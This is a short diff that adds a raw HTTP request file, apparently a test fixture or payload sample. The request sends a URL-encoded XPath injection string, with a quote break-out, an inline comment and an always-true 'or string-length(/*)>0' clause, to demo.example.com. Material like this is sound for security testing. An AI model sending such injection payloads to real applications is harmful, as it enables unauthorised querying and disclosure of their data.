@@ -1,0 +1,4 @@
+GET /a?input="%20/*x*/or%20string-length(/*)>0%20or%20" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
